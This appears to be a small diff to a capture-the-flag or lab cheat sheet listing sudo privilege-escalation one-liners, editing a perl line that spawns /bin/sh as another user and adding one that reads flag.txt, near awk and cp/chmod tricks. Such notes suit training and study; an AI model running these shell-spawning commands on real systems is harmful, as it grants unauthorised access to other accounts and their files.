@@ -55,7 +55,8 @@ Poratble Database
 ##### sudo -u user awk {'print $1'} ~/flag.txt
 
 ### Privilege Escalation abusing perl
-#### sudo -u victim perl -e 'exec "/bin/sh";'
+#### sudo -u user perl -e 'exec "/bin/sh";'
+#### sudo -u user perl -e 'print `cat flag.txt`'
 
 ### Privilege Escalation with cp and chmod
 #### Copy the /bin/bash to /tmp/test
